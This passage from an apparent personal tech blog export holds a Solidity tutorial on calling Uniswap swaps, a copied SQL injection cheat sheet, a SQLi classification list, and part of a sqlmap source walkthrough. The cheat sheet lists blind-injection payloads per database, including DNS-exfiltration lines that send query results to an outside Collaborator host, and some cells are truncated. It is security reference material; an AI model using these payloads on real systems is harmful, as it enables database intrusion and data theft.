function_">approve</span>(<span class="title function_">address</span>(<span class="variable constant_">ROUTER</span>), <span class="number">1000000</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getPathForTokenToEth</span>(<span class="params">address token</span>) private view returns (address[] memory)&#123;</span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = token;</span><br><span class="line">        path[<span class="number">1</span>] = <span class="variable constant_">ROUTER</span>.<span class="title function_">WETH</span>();</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getPathForEthToToken</span>(<span class="params">address token</span>) private view returns (address[] memory)&#123;</span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="variable constant_">ROUTER</span>.<span class="title function_">WETH</span>();</span><br><span class="line">        path[<span class="number">1</span>] = token;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">address payable _address, uint withdrawAmount</span>) public payable isOwner&#123;</span><br><span class="line">        _address.<span class="title function_">transfer</span>(withdrawAmount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// important to receive ETH</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>实例化合约:</h1>
<p>知道合约的interface和合约地址后，就可以实例化合约了。</p>
<h1>Eth -&gt; Token:</h1>
<h2 id="定义receive函数">定义receive函数:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">receive 接收以太函数</span><br><span class="line">一个合约最多有一个 receive 函数, 声明函数为： receive() external payable &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">不需要 function 关键字，也没有参数和返回值并且必须是　external　可见性和　payable 修饰． 它可以是 virtual 的，可以被重载也可以有 修改器modifier 。</span><br></pre></td></tr></table></figure>
<p>合约里要定义receive函数才能接受eth</p>
<h2 id="swapExactETHForTokens-2">swapExactETHForTokens:</h2>
<p>要用到<code>uniswapRouter</code>的<code>swapExactETHForTokens</code>函数:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swapExactETHForTokens</span>(<span class="params">uint amountOutMin, address[] calldata path, address to, uint deadline</span>)</span><br><span class="line">    external</span><br><span class="line">    virtual</span><br><span class="line">    override</span><br><span class="line">    payable</span><br><span class="line">    <span class="title function_">ensure</span>(deadline)</span><br><span class="line">    returns (uint[] memory amounts)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">require</span>(path[<span class="number">0</span>] == <span class="variable constant_">WETH</span>, <span class="string">&#x27;UniswapV2Router: INVALID_PATH&#x27;</span>);</span><br><span class="line">    amounts = <span class="title class_">UniswapV2Library</span>.<span class="title function_">getAmountsOut</span>(factory, msg.<span class="property">value</span>, path); <span class="comment">// 获得可兑换出来的数量</span></span><br><span class="line">    <span class="built_in">require</span>(amounts[amounts.<span class="property">length</span> - <span class="number">1</span>] &gt;= amountOutMin, <span class="string">&#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span>); <span class="comment">// 可兑换的数量要大于我们的期望值</span></span><br><span class="line">    <span class="title function_">IWETH</span>(<span class="variable constant_">WETH</span>).<span class="property">deposit</span>&#123;<span class="attr">value</span>: amounts[<span class="number">0</span>]&#125;();</span><br><span class="line">    <span class="title function_">assert</span>(<span class="title function_">IWETH</span>(<span class="variable constant_">WETH</span>).<span class="title function_">transfer</span>(<span class="title class_">UniswapV2Library</span>.<span class="title function_">pairFor</span>(factory, path[<span class="number">0</span>], path[<span class="number">1</span>]), amounts[<span class="number">0</span>]));</span><br><span class="line">    <span class="title function_">_swap</span>(amounts, path, to); <span class="comment">// swap</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数有<code>payable</code>修饰，需要输入eth的数量通过<code>msg.value</code>传入</p>
<p>通过在自己合约里调用<code>swapExactETHForTokens</code>函数的流程是:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swapEthToToken</span>(<span class="params">address token, uint TokenOutAmountMin</span>) public payable&#123;</span><br><span class="line">    uint deadline = block.<span class="property">timestamp</span> + <span class="number">100</span>;</span><br><span class="line">    <span class="variable constant_">ROUTER</span>.<span class="property">swapExactETHForTokens</span>&#123; <span class="attr">value</span>: msg.<span class="property">value</span> &#125;(<span class="title class_">TokenOutAmountMin</span>, <span class="title function_">getPathForEthToToken</span>(token), <span class="title function_">address</span>(<span class="variable language_">this</span>), deadline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>函数为payable</p>
</li>
<li class="lvl-3">
<p>调用函数的同时转账<code>msg.value</code>数量的eth</p>
</li>
<li class="lvl-3">
<p>eth继续通过<code>msg.value</code>传入，调用<code>swapExactETHForTokens</code></p>
</li>
</ol>
<h1>Token -&gt; Eth:</h1>
<p>这里要用到<code>uniswapRouter</code>的<code>swapTokensForExactETH</code>函数，一开始遇到<code>Fail with error 'TransferHelper: ETH_TRANSFER_FAILED'</code>报错看了一下函数的定义</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swapTokensForExactETH</span>(<span class="params">uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline</span>)</span><br><span class="line">    external</span><br><span class="line">    virtual</span><br><span class="line">    override</span><br><span class="line">    <span class="title function_">ensure</span>(deadline)</span><br><span class="line">    returns (uint[] memory amounts)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">require</span>(path[path.<span class="property">length</span> - <span class="number">1</span>] == <span class="variable constant_">WETH</span>, <span class="string">&#x27;UniswapV2Router: INVALID_PATH&#x27;</span>);</span><br><span class="line">    amounts = <span class="title class_">UniswapV2Library</span>.<span class="title function_">getAmountsIn</span>(factory, amountOut, path);</span><br><span class="line">    <span class="built_in">require</span>(amounts[<span class="number">0</span>] &lt;= amountInMax, <span class="string">&#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;</span>);</span><br><span class="line">    <span class="title class_">TransferHelper</span>.<span class="title function_">safeTransferFrom</span>(</span><br><span class="line">        path[<span class="number">0</span>], msg.<span class="property">sender</span>, <span class="title class_">UniswapV2Library</span>.<span class="title function_">pairFor</span>(factory, path[<span class="number">0</span>], path[<span class="number">1</span>]), amounts[<span class="number">0</span>]</span><br><span class="line">    );  <span class="comment">// Here</span></span><br><span class="line">    <span class="title function_">_swap</span>(amounts, path, <span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    <span class="title function_">IWETH</span>(<span class="variable constant_">WETH</span>).<span class="title function_">withdraw</span>(amounts[amounts.<span class="property">length</span> - <span class="number">1</span>]);</span><br><span class="line">    <span class="title class_">TransferHelper</span>.<span class="title function_">safeTransferETH</span>(to, amounts[amounts.<span class="property">length</span> - <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有payable修饰，在兑换成ETH之前，需要把token转进去</p>
<p>通过在自己合约里调用<code>swapTokensForExactETH</code>函数的流程是:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swapTokenToEth</span>(<span class="params">address token, uint amountOut, uint amountInMax </span>) public&#123;</span><br><span class="line">    <span class="title class_">IERC20</span>(token).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amountInMax); <span class="comment">// 往合约里转账</span></span><br><span class="line">    <span class="title function_">_approveTokenIfNeeded</span>(token);</span><br><span class="line">    uint deadline = block.<span class="property">timestamp</span> + <span class="number">100</span>;</span><br><span class="line">    <span class="variable constant_">ROUTER</span>.<span class="title function_">swapTokensForExactETH</span>(amountOut, amountInMax, <span class="title function_">getPathForTokenToEth</span>(token), <span class="title function_">address</span>(<span class="variable language_">this</span>), deadline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>自己的钱包地址授权<code>Dai</code>额度给自己的合约地址</p>
</li>
<li class="lvl-3">
<p>合约从钱包里提取一定额度<code>Dai</code></p>
</li>
<li class="lvl-3">
<p>合约授权<code>Dai</code>给uniswap router</p>
</li>
<li class="lvl-3">
<p>uniswap router从合约里提取<code>Dai</code>，兑换成eth，再发回来</p>
</li>
</ol>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/PancakeBunny-finance/Bunny/blob/main/contracts/zap/ZapBSC.sol">https://github.com/PancakeBunny-finance/Bunny/blob/main/contracts/zap/ZapBSC.sol</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/question/1828">使用智能合约调用Uniswap交换token时出现错误</a></p>
</li>
<li class="lvl-2">
<p><a href="https://soliditydeveloper.com/uniswap2">Using the new Uniswap v2 in your contracts</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/docs/solidity/contracts.html#receive">receive函数</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol">https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>SmartContract</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL injection cheat sheet</title>
    <url>/2019/26.html</url>
    <content><![CDATA[<p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
<h1>String concatenation 字符串连接</h1>
<p>You can concatenate together multiple strings to make a single string.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left">`‘foo’</td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>'foo'+'bar'</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left">`‘foo’</td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>'foo' 'bar' [Note the space between the two strings]</code> <br> <code>CONCAT('foo','bar')</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>Comments 注释</h1>
<p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left"><code>--comment</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>--comment</code> <br> <code>/*comment*/</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>--comment</code> <br> <code>/*comment*/</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>#comment</code> <br><code>-- comment [Note the space after the double dash]</code> <br><code>/*comment*/</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>Database version 数据库版本</h1>
<p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left"><code>SELECT banner FROM v$version</code> <br><code>SELECT version FROM v$instance</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>SELECT @@version</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>SELECT version()</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>SELECT @@version</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>Database contents 数据库内容</h1>
<p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left"><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>Conditional errors 条件错误</h1>
<p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>Batched (or stacked) queries 批量查询</h1>
<p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left"><code>Does not support batched queries.</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>Does not support batched queries.</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>Time delays 时间延迟</h1>
<p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left"><code>dbms_pipe.receive_message(('a'),10)</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>WAITFOR DELAY '0:0:10'</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>SELECT pg_sleep(10)</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>	SELECT sleep(10)</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>Conditional time delays 有条件的时间延迟</h1>
<p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left">`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’</td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>DNS lookup DNS查询</h1>
<p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left">The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<code>SELECT extractvalue(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;'),'/l') FROM dual</code><br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<code>SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left">The following techniques work on Windows only:<br><code>LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')</code><br><code>SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</h1>
<p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
<table>
<thead>
<tr>
<th style="text-align:left">database</th>
<th style="text-align:left">example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left">`SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?>&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://’</td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree &quot;//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;')</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left">create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := ‘copy (SELECT ‘’’') to program ''nslookup ’</td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left">The following technique works on Windows only:<code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</code></td>
</tr>
</tbody>
</table>
<hr />
<h1>总结:</h1>
<p>SQL注入在不同数据库的表现,可表现在这些方面:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>String concatenation 字符串连接</p>
</li>
<li class="lvl-2">
<p>Comments 注释</p>
</li>
<li class="lvl-2">
<p>Database version 数据库版本的查询</p>
</li>
<li class="lvl-2">
<p>Database contents 数据库内容的查询</p>
</li>
<li class="lvl-2">
<p>Conditional errors 条件错误</p>
</li>
<li class="lvl-2">
<p>Batched (or stacked) queries 批量查询</p>
</li>
<li class="lvl-2">
<p>Time delays 时间延迟</p>
</li>
<li class="lvl-2">
<p>Conditional time delays 有条件的时间延迟</p>
</li>
<li class="lvl-2">
<p>DNS lookup DNS查询<br />
DNS lookup with data exfiltration 使用数据泄露进行DNS查找</p>
</li>
</ul>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-注入的分类</title>
    <url>/2019/13187.html</url>
    <content><![CDATA[<h1>基于从服务器接收到的响应</h1>
<ul class="lvl-0">
<li class="lvl-2">基于错误的SQL注入</li>
<li class="lvl-2">联合查询的类型</li>
<li class="lvl-2">堆查询注射</li>
<li class="lvl-2">SQL盲注</li>
<li class="lvl-2">基于布尔SQL盲注</li>
<li class="lvl-2">基于时间的SQL盲注</li>
<li class="lvl-2">基于报错的SQL盲注</li>
</ul>
<h1>基于如何处理输入的SQL查询(数据类型)</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>基于字符串</p>
</li>
<li class="lvl-2">
<p>数字或整数为基础</p>
</li>
</ul>
<h1>基于程度和顺序的注入(哪里发生了影响)</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>一阶注射</p>
</li>
<li class="lvl-2">
<p>二阶注射</p>
</li>
</ul>
<p>一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.</p>
<h1>基于注入点的位置上的</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>通过用户输入的表单域的注射</p>
</li>
<li class="lvl-2">
<p>通过cookie注射</p>
</li>
<li class="lvl-2">
<p>通过服务器变量注射(基于头部信息的注射)</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap源码-AttribDict属性字典</title>
    <url>/2019/11158.html</url>
    <content><![CDATA[<h1>pre:</h1>
<p>sqlmap在处理数据的时候大量使用了自定义的<code>AttribDict</code>属性字典这个数据类型.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sqlmap paths</span></span><br><span class="line">paths = AttribDict()</span><br><span class="line"></span><br><span class="line"><span class="comment"># object to store original command line options</span></span><br><span class="line">cmdLineOptions = AttribDict()</span><br><span class="line"></span><br><span class="line"><span class="comment"># object to store merged options (command line, configuration file and default options)</span></span><br><span class="line">mergedOptions = AttribDict()</span><br><span class="line"></span><br><span class="line"><span class="comment"># object to share within function and classes command</span></span><br><span class="line"><span class="comment"># line options and settings</span></span><br><span class="line">conf = AttribDict()</span><br><span class="line"></span><br><span class="line"><span class="comment"># object to share within function and classes results</span></span><br><span class="line">kb = AttribDict()</span><br></pre></td></tr></table></figure>
<p>所以有必要看看<code>AttribDict</code>这个类.</p>
<p>顺便总结一下自己不熟悉的相关知识点.</p>
<hr />
<h1><code>AttribDict</code>组成:</h1>
<p>这个类通过override了几个<code>super method</code>.</p>
<p>修改原生的<code>dict</code>定制成了自己项目需要的属性字典.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d71bed008.jpg" alt="" /></p>
<hr />
<h2 id="定义-2">定义:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">This class defines the sqlmap object, inheriting from Python data</span><br><span class="line">type dictionary.</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; foo = AttribDict()</span><br><span class="line">&gt;&gt;&gt; foo.bar = 1</span><br><span class="line">&gt;&gt;&gt; foo.bar</span><br><span class="line">1</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>原来的字典的用法:<code>dict1[&quot;key&quot;]</code><br />
现在的自定义字典的用法:<code>dict1.key</code></p>
<hr />
<h2 id="init-初始化"><code>__init__</code> 初始化</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, indict=<span class="literal">None</span>, attribute=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> indict <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line">        indict = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set any attributes here - before initialisation</span></span><br><span class="line">    <span class="comment"># these remain as normal attributes   在初始化之前设置通用属性</span></span><br><span class="line">    self.attribute = attribute</span><br><span class="line">    <span class="built_in">dict</span>.__init__(self, indict)</span><br><span class="line">    self.__initialised = <span class="literal">True</span> <span class="comment"># 初始化标志</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># After initialisation, setting attributes</span></span><br><span class="line">    <span class="comment"># is the same as setting an item  初始化之后</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="setattr-对一个属性赋值"><code>__setattr__</code> 对一个属性赋值</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__setattr__</span>(<span class="params">self, item, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Maps attributes to values</span></span><br><span class="line"><span class="string">    Only if we are initialised   只对初始化过的实例赋值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># This test allows attributes to be set in the __init__ method</span></span><br><span class="line">    <span class="comment"># 允许在初始化的时候设置属性</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;_AttribDict__initialised&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.__dict__:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dict</span>.__setattr__(self, item, value)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Any normal attributes are handled normally</span></span><br><span class="line">    <span class="keyword">elif</span> item <span class="keyword">in</span> self.__dict__: <span class="comment"># 如果已经设置过了</span></span><br><span class="line">        <span class="built_in">dict</span>.__setattr__(self, item, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># 没设置过的</span></span><br><span class="line">        self.__setitem__(item, value)</span><br></pre></td></tr></table></figure>
<p>例如执行以下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">kb = AttribDict()</span><br><span class="line">kb.a = <span class="number">1</span> </span><br></pre></td></tr></table></figure>
<p><code>kb = AttribDict()</code>执行完,也就初始化完<code>kb</code>这个实例了,对象的属性储存在对象的<code>__dict__</code>属性中,这个时候它的<code>__dict__</code>为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;_AttribDict__initialised&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;attribute&#x27;</span>: <span class="literal">None</span>&#125;</span><br></pre></td></tr></table></figure>
<p>执行<code>kb.a=1</code>即对实例的属性赋值的时候,就会隐式调用到<code>__setattr__</code>这个super method.</p>
<p>首先会在<code>__dict__</code>搜索是否初始化过的标志属性</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果未初始化过的话,返回一个<code>dict</code>.</p>
</li>
<li class="lvl-2">
<p>如果初始化过的实例,会根据<code>key</code>在<code>__dict__</code>搜索</p>
<ul class="lvl-2">
<li class="lvl-4">如果这个属性已经设置过的话,会调用</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span>.__setattr__(self, item, value)</span><br><span class="line"><span class="comment"># 相当于执行`self.itme = value`,对一个属性赋值(覆盖已有属性)</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-2">
<li class="lvl-4">
<p>如果这个属性没设置过的话,会调用</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.__setitem__(item, value)</span><br><span class="line"><span class="comment"># 相当于执行`self[key] = val`,对新索引值赋值</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr />
<h2 id="getattr-访问一个不存在的属性"><code>__getattr__</code> 访问一个不存在的属性</h2>
